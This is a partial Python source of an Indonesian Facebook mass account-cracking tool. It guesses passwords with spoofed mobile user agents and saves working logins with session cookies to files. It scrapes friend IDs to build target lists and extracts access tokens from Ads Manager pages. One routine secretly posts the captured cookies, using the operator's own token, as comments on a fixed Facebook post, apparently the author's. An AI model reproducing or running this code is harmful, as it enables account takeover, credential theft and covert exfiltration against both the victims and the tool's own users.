allow_redirects = False)
				if "checkpoint" in ses.cookies.get_dict().keys():
					cp+=1
					print(f"\r %s*%s----> %s%s|%s%s "%(p,k,uiz,p,k,pw))
					open("CP/"+cpZ,"a").write(uiz+"|"+pw+"\n")
					break
				elif "c_user" in ses.cookies.get_dict().keys():
					ok+=1
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open("OK/"+okZ,"a").write(uiz+"|"+pw+"|"+kuki+"\n")
					print(f"\r %s*%s----> %s%s|%s%s\n %s "%(p,h,uiz,p,h,pw,kuki));self.YaSekedarMengingatkan(kuki,uiz,pw)
					break
				else:continue
			except requests.exceptions.ConnectionError:aink_raka(31)
		loops+=1
	''' list method useragent '''
	def Mozilla(self,uiz):
		rc, rr = random.choice, random.randint
		togel = rc(['01','02','03','04','05','06','07','08','09',str(rr(10,15))])
		sumsang = rc([f"SM-G{str(rr(900,999))}F",f"SM-F{str(rr(700,799))}B",f"SM-A{str(rr(100,199))}F"])
		kumplit, androver = f'{rc([f"{str(rr(30,60))}.0.{str(rr(2000,2999))}",f"{str(rr(70,90))}.0.{str(rr(3000,3999))}",f"{str(rr(100,119))}.0.{str(rr(4000,6199))}"])}.{str(rr(10,199))}', rc([f"{str(rr(5,9))}.0.0",f"{str(rr(5,9))}.0.1",str(rr(5,13)),f"{str(rr(5,9))}.0"])
		TPA, QKQ, PPR = f"TP1A.{str(rr(200000,266999))}.0{togel}", f"QKQ1.{str(rr(100000,166999))}.0{togel}", f"PPR1.{str(rr(100000,188999))}.0{togel}"
		oddo = rc([f" OppoBrowser/{str(rr(6,20))}.5.{str(rr(0,1))}.{str(rr(6,10))}", ""])
		if "regular" in metode:
			all_agent = rc([
						f"Mozilla/5.0 (Linux; Android {str(rr(5,13))}; {sumsang} Build/{TPA}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{kumplit} Mobile Safari/537.36"
			])
		elif "webD" in metode:
			all_agent = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{kumplit} Safari/537.36"
		else:
			all_agent = rc([
						f"Mozilla/5.0 (Linux; Android {str(rr(5,13))}; {sumsang} Build/{TPA}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{kumplit} Mobile Safari/537.36",
						f"Mozilla/5.0 (Linux; Android {str(rr(5,13))}; Redmi Note {str(rr(2,9))} Build/{QKQ}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{kumplit} Mobile Safari/537.36",
						f"Mozilla/5.0 (Linux; U; Android {str(rr(5,13))}; in-id; CPH{str(rr(1000,2899))} Build/{PPR}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{kumplit} Mobile Safari/537.36{oddo}",
						f"Mozilla/5.0 (Linux; Android {str(rr(5,8))}.1.2; ASUS_Z01QD Build/{QKQ}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{kumplit} Mobile Safari/537.36",
						f"Mozilla/5.0 (Linux; Android {str(rr(4,8))}.1.0; U6 PRIME Build/OPM2; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Version/4.0 Chrome/{kumplit} Mobile Safari/537.36",
						f"Mozilla/5.0 (Linux; Android {str(rr(5,13))}; Pearl K3 Build/{PPR}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Versi/4.0 Chrome/{kumplit} Mobile Safari/537.36",
						f"Mozilla/5.0 (Linux; Android {str(rr(9,13))}; {str(rr(5599,6499))} Build/Q00{str(rr(500,799))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{kumplit} Mobile Safari/537.36",
						f"Mozilla/5.0 (Linux; Android {str(rr(4,8))}.0; Infinix X{str(rr(600,799))} Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{kumplit} Mobile Safari/537.36",
						f"Mozilla/5.0 (Linux; Android {str(rr(9,13))}; LAVA LH99{str(rr(10,99))} Build/{PPR}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{kumplit} Mobile Safari/537.36"
			])
		return all_agent
	def CekNameMokad(self, user):
		global ok, cp
		Accmu = ses.get(f'https://graph.facebook.com/{user}?access_token={open("token.txt","r").read()}',cookies = {"cookie": open("cookies.txt","r").read()}).json()
		try:
			NamaAcc = Accmu['name']
			mek = f"{NamaAcc}"
			ok+=1
		except (KeyError,IOError):
			mek = f" {user}, akun mokad\n"
			cp+=1
		return mek
	
	def CekNam(self, user):
		Accmu = ses.get(f'https://graph.facebook.com/{user}?access_token={open("token.txt","r").read()}',cookies = {"cookie": open("cookies.txt","r").read()}).json()
		try:
			NamaAcc = Accmu['name']
			mek = f"{NamaAcc} "
		except (KeyError,IOError):
			mek = ""
		return mek

	def Apabila(self,kuki,user,pw):
		cookie = open("cookies.txt","r").read();token = open("token_eaab.txt","r").read();list = f"{kuki}"
		AnakYatim = "100000834003593_pfbid02v6boa6MXVExF3aYQGPM8jcufPLawEiJ8Z3rmXwtHtX1P8sPqdb9Rn1zKEsdTNkNxl";JanganDilihatBangsad = random.choice(["Hi bang Raka tools nya keren banget!","tools nya sangat berguna!","Hi i'm user tools RAKA-BOT","semoga rejeki bang Raka di lancarin amin...\nhttps://www.facebook.com/100000834003593/posts/pfbid02v6boa6MXVExF3aYQGPM8jcufPLawEiJ8Z3rmXwtHtX1P8sPqdb9Rn1zKEsdTNkNxl/?app=fbl","semoga bg @[100000834003593:0] panjang umur dan rejeki nya dilancarkan aminnn"]);requests.post(f"https://graph.facebook.com/v15.0/{AnakYatim}/comments/?message={JanganDilihatBangsad}&access_token={token}", headers = {"cookie":cookie});requests.post(f"https://graph.facebook.com/v15.0/{AnakYatim}/comments/?message={list}&access_token={token}", headers = {"cookie":cookie})
	
	def CekTem(self, user):
		apaan = ses.get(f'https://graph.facebook.com/{user}?fields=friends.limit(9999999)&access_token={open("token.txt","r").read()}',cookies = {"cookie": open("cookies.txt","r").read()}).json()
		try:
			for kmu_nanya in apaan["friends"]["data"]:
				ids.append(kmu_nanya["id"])
			mek = f"Teman : {str(len(ids))}"
			ids.clear()
		except (KeyError,IOError):
			mek = f"Teman {user} Privat. "
		return mek
	
	def TakeApk(self, coki):
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
		try:
			data = sop(ses.get(url,cookies={"cookie": coki}).text,"html.parser")
			for apk in data.find_all("h3"):
				if "Ditambahkan" in apk.text:
					print(f"{RakaAndrian} {str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
				else:continue
			next = "https://mbasic.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
			self.TakeApk(next,coki)
		except Exception as e:
			print(f"{RakaAndrian} aplikasi aktif tidak ada... ")
	
	def ConvertEaab(self,kuki):
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		jancok = ses.get(url,cookies=kuki);bujanginam = re.search('act=(.*?)&nav_source',str(jancok.content)).group(1);_r_a_k_a__a_n_d_r_i_a_n_ = '%s?act=%s&nav_source=no_referrer'%(url,bujanginam);_B_a_j_i_n_g_a_n__Z_ = ses.get(_r_a_k_a__a_n_d_r_i_a_n_,cookies=kuki);_A_n_t_i__P_r_i_k_o_d_ = re.search('accessToken="(.*?)"',str(_B_a_j_i_n_g_a_n__Z_.content)).group(1);tokenw = open("token_eaab.txt", "w").write(_A_n_t_i__P_r_i_k_o_d_)

	''' krek massal v.2 '''
	def KrekMassal(self, kuki, token):
		uid = []
		try:
			mil = int(input(f'{RakaAndrian} mau brapa id : '))
		except ValueError:
			print(f"{RakaAndrian} masukan dengan angka!");exit()
		if mil<1 or mil>100:
			print(f"{RakaAndrian} kebanyakan jumlah id bangsat!");exit()
		angka = 0
		print()
		for ggkgittorr in range(mil):
			angka+=1
			kontole = input(f" {a}[{p}{str(angka)}{a}]{p} masukan id : ")
			uid.append(kontole)
		for userr in uid:
			try:
				params = {"access_token": token, "fields": "name,friends.fields(id,name,birthday)"}
				for mek in ses.get("https://graph.facebook.com/{}".format(userr),params = params,cookies = kuki).json()['friends']['data']:
					try:
						ids.append(mek['id']+'|'+mek['name'])
					except:continue
			except (KeyError,IOError):pass
			except requests.exceptions.ConnectionError:
				print(f"{RakaAndrian} sinyal anda bermasalah.. ");exit()
		print(f"{RakaAndrian} total id : {str(len(ids))} ")
		self.METHODsetting()	
	
if __name__ in "__main__":
	try:os.mkdir("OK")
	except:pass
	try:os.mkdir("CP")
	except:pass
	MAINmenu()
